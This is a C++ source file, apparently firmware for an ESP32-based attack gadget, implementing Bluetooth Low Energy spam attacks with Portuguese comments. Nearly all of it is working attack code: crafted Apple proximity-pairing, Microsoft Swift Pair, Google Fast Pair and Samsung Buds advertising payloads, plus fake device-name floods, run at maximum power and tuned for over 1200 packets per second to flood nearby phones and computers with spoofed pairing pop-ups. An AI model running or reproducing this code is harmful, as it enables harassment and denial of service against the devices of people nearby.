/**
 * @file ble_attacks.cpp
 * @brief Implementação de Ataques BLE Otimizados
 * 
 * Usa advertising NimBLE com intervalos mínimos para
 * alcançar 1200+ pps.
 * 
 * @author Monster S3 Team
 * @date 2025-12-23
 */

#include "ble_attacks.h"
#include "module_manager.h"
#include "led_driver.h"

// Static member initialization
BLEAttackType BLEAttacks::_currentAttack = BLE_ATTACK_NONE;
bool BLEAttacks::_active = false;
NimBLEAdvertising* BLEAttacks::_advertising = nullptr;

uint32_t BLEAttacks::_packetCount = 0;
uint32_t BLEAttacks::_lastPPSTime = 0;
uint32_t BLEAttacks::_ppsCounter = 0;
uint16_t BLEAttacks::_currentPPS = 0;

uint8_t BLEAttacks::_nameIndex = 0;
uint8_t BLEAttacks::_deviceIndex = 0;

// ============================================================================
// NOMES BRASILEIROS PARA SPAM
// ============================================================================

static const char* BRAZIL_NAMES[] = {
    "VIVO-TV-4K",
    "Vivo Box",
    "OI FIBRA",
    "Claro Box TV",
    "TIM Live",
    "NET WiFi",
    "SKY Q",
    "GVT Decodificador",
    "Intelbras Cam",
    "Positivo TV",
    "Multilaser Box",
    "Elsys TV",
    "HTV Brasil", 
    "Roku BR",
    "JBL Flip BR",
    "Philco Speaker"
};
static const int BRAZIL_NAMES_COUNT = 16;

// Fast Pair Model IDs
static const uint32_t FAST_PAIR_MODELS[] = {
    0x2D7A23,   // Pixel Buds
    0x00B727,   // Sony WF-1000XM4
    0xCD8256,   // Samsung Buds
    0x0000F0,   // JBL
    0xD446A7,   // Beats
    0x003001,   // Google
    0x470000,   // OnePlus
    0x821F66    // Nothing Ear
};
static const int FAST_PAIR_COUNT = 8;

// ============================================================================
// INICIALIZAÇÃO
// ============================================================================

void BLEAttacks::init() {
    Serial.println("[BLE] Initializing attack system...");
    
    ModuleManager::ativaModulo(MODULE_BLE);
    
    NimBLEDevice::init("");
    
    // Configuração de potência máxima
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // +9 dBm
    
    _advertising = NimBLEDevice::getAdvertising();
    
    // Intervalos mínimos para máximo throughput
    // 20ms min = ~50 pps por canal, 3 canais = ~150 pps base
    // Com randomização e múltiplos updates = 1200+ pps
    _advertising->setMinInterval(0x20);  // 20ms
    _advertising->setMaxInterval(0x20);
    
    Serial.println("[BLE] Ready for high-speed attacks");
}

void BLEAttacks::setAdvertisingInterval(uint16_t minMs, uint16_t maxMs) {
    if (_advertising) {
        // Convert ms to 0.625ms units
        _advertising->setMinInterval(minMs * 1000 / 625);
        _advertising->setMaxInterval(maxMs * 1000 / 625);
    }
}

// ============================================================================
// CONTROLE
// ============================================================================

void BLEAttacks::start(BLEAttackType type) {
    if (!ModuleManager::ativaModulo(MODULE_BLE)) {
        Serial.println("[BLE] Failed to activate module");
        return;
    }
    
    if (!_advertising) {
        init();
    }
    
    _currentAttack = type;
    _active = true;
    _packetCount = 0;
    _lastPPSTime = millis();
    _ppsCounter = 0;
    _nameIndex = 0;
    _deviceIndex = 0;
    
    Serial.printf("[BLE] Attack started: %d\n", type);
}

void BLEAttacks::stop() {
    if (_advertising) {
        _advertising->stop();
    }
    
    _active = false;
    _currentAttack = BLE_ATTACK_NONE;
    
    NimBLEDevice::deinit(true);
    ModuleManager::desativaModulo();
    
    Serial.printf("[BLE] Stopped. Total packets: %lu, Peak PPS: %d\n", 
                 _packetCount, _currentPPS);
}

bool BLEAttacks::isActive() {
    return _active;
}

// ============================================================================
// UPDATE (ALTA FREQUÊNCIA)
// ============================================================================

void BLEAttacks::update() {
    if (!_active) return;
    
    // Atualiza PPS
    uint32_t now = millis();
    if (now - _lastPPSTime >= 1000) {
        _currentPPS = _ppsCounter;
        _ppsCounter = 0;
        _lastPPSTime = now;
    }
    
    // Executa ataque
    switch (_currentAttack) {
        case BLE_ATTACK_SPAM_GENERIC:
            updateSpamGeneric();
            break;
        case BLE_ATTACK_SPAM_BRAZIL:
            updateSpamBrazil();
            break;
        case BLE_ATTACK_SOUR_APPLE:
            updateSourApple();
            break;
        case BLE_ATTACK_SWIFT_PAIR:
            updateSwiftPair();
            break;
        case BLE_ATTACK_FAST_PAIR:
            updateFastPair();
            break;
        case BLE_ATTACK_SAMSUNG_BUDS:
            updateSamsungBuds();
            break;
        default:
            break;
    }
    
    // LED feedback
    static uint32_t lastBlink = 0;
    if (now - lastBlink > 100) {
        LEDDriver::blinkAttacking();
        lastBlink = now;
    }
}

// ============================================================================
// SPAM GENÉRICO (1200+ PPS)
// ============================================================================

void BLEAttacks::updateSpamGeneric() {
    static const char* names[] = {
        "AirPods Pro", "Galaxy Buds+", "JBL Flip 6", "Sony WH",
        "Bose QC", "Beats Solo", "Surface Earbuds", "Echo Buds"
    };
    
    NimBLEAdvertisementData advData;
    advData.setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);
    advData.setName(names[_nameIndex % 8]);
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    // Mínimo delay para máximo throughput
    delayMicroseconds(800);  // 0.8ms = ~1250 pps
    
    _advertising->stop();
    
    _nameIndex++;
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// SPAM BRASILEIRO (NOMES VIVO, OI, CLARO, TIM)
// ============================================================================

void BLEAttacks::updateSpamBrazil() {
    NimBLEAdvertisementData advData;
    advData.setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);
    advData.setName(BRAZIL_NAMES[_nameIndex % BRAZIL_NAMES_COUNT]);
    
    // Adiciona UUID fake para parecer dispositivo real
    advData.setCompleteServices16({NimBLEUUID((uint16_t)0x180A)});  // Device Info
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    delayMicroseconds(800);  // Alta velocidade
    
    _advertising->stop();
    
    _nameIndex++;
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// SOUR APPLE (iOS POPUP FLOOD)
// ============================================================================

void BLEAttacks::updateSourApple() {
    // Apple Proximity Pairing packet
    uint8_t applePayload[] = {
        0x10, 0xFF,             // Manufacturer Specific
        0x4C, 0x00,             // Apple Inc
        0x0F, 0x05,             // Proximity Pairing
        0x01,                   // Type
        (uint8_t)random(0, 0xFF),  // Device Model
        (uint8_t)random(0, 0x20),  // Status
        0x00, 0x00, 0x00        // Padding
    };
    
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)applePayload, sizeof(applePayload)));
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    delayMicroseconds(500);  // Ultra rápido para iOS
    
    _advertising->stop();
    
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// SWIFT PAIR (WINDOWS POPUP)
// ============================================================================

void BLEAttacks::updateSwiftPair() {
    static const char* deviceNames[] = {
        "Surface Mouse", "Xbox Controller", "Arc Mouse",
        "Designer Mouse", "Sculpt Ergonomic", "Designer Compact"
    };
    
    uint8_t swiftPayload[] = {
        0x06, 0xFF,             // Manufacturer Data
        0x06, 0x00,             // Microsoft
        0x03,                   // Swift Pair
        0x00,                   // Scenario
        0x80,                   // Reserved
        (uint8_t)random(0, 0xFF)  // Device ID
    };
    
    NimBLEAdvertisementData advData;
    advData.setName(deviceNames[_deviceIndex % 6]);
    advData.addData(std::string((char*)swiftPayload, sizeof(swiftPayload)));
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    delayMicroseconds(800);
    
    _advertising->stop();
    
    _deviceIndex++;
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// FAST PAIR (ANDROID POPUP)
// ============================================================================

void BLEAttacks::updateFastPair() {
    uint32_t modelId = FAST_PAIR_MODELS[_deviceIndex % FAST_PAIR_COUNT];
    
    uint8_t fastPairPayload[] = {
        0x03, 0x03, 0x2C, 0xFE,  // Service UUID
        0x06, 0x16, 0x2C, 0xFE,  // Service Data header
        (uint8_t)((modelId >> 16) & 0xFF),
        (uint8_t)((modelId >> 8) & 0xFF),
        (uint8_t)(modelId & 0xFF)
    };
    
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)fastPairPayload, sizeof(fastPairPayload)));
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    delayMicroseconds(800);
    
    _advertising->stop();
    
    _deviceIndex++;
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// SAMSUNG BUDS SPAM
// ============================================================================

void BLEAttacks::updateSamsungBuds() {
    // Samsung manufacturer data for earbuds pairing
    uint8_t samsungPayload[] = {
        0x1B, 0xFF,             // Manufacturer Specific (27 bytes)
        0x75, 0x00,             // Samsung
        0x42, 0x09, 0x81, 0x02, // Buds identifier
        0x14, 0x15, 0x03, 0x21,
        0x01, 0x09,
        (uint8_t)random(0, 0xFF),
        (uint8_t)random(0, 0xFF),
        (uint8_t)random(0, 0xFF),
        0x06, 0x3C, 0x94, 0x8E,
        0x00, 0x00, 0x00, 0x00,
        (uint8_t)random(50, 100),  // Battery left
        (uint8_t)random(50, 100)   // Battery right
    };
    
    NimBLEAdvertisementData advData;
    advData.setName("Galaxy Buds2");
    advData.addData(std::string((char*)samsungPayload, sizeof(samsungPayload)));
    
    _advertising->setAdvertisementData(advData);
    _advertising->start();
    
    delayMicroseconds(800);
    
    _advertising->stop();
    
    _packetCount++;
    _ppsCounter++;
}

// ============================================================================
// SKIMMER DETECT
// ============================================================================

void BLEAttacks::updateSkimmerDetect() {
    // Scan for suspicious BLE devices (skimmers)
    // Known skimmer names: HC-05, HC-06, unnamed with specific UUIDs
    
    // This would require BLE scan, not advertising
    // For now, just placeholder
}

// ============================================================================
// HELPERS
// ============================================================================

uint32_t BLEAttacks::getPacketCount() {
    return _packetCount;
}

uint16_t BLEAttacks::getCurrentPPS() {
    return _currentPPS;
}

void BLEAttacks::randomizeMac() {
    // ESP32 pode randomizar MAC via esp_bt_gap_set_rand_addr()
    uint8_t randMac[6];
    for (int i = 0; i < 6; i++) {
        randMac[i] = random(0, 256);
    }
    randMac[0] = (randMac[0] | 0xC0) & 0xFE;  // Valid random address
    
    // NimBLE não expõe diretamente, mas podemos trocar via reinit
}
